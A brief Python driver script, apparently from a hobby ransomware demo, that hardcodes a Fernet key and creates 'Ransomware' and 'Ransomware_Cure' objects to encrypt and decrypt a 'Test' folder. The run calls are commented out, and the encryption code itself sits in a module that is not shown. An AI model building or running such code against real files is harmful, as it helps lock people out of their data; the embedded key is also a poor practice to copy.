# Import Section
from cryptography.fernet import Fernet
from os import listdir, path

from Classes import Encrypt, Decrypt

# Variables
KEY_1 = b'8cho8RKkVrN-JAjO0GtYGZkv1wg04fzjo_yhu-ZAyC4='

# Main
Ransomware = Encrypt('Test\\', KEY_1)
# Ransomware.Main()

Ransomware_Cure = Decrypt('Test\\', KEY_1)
# Ransomware_Cure.Main()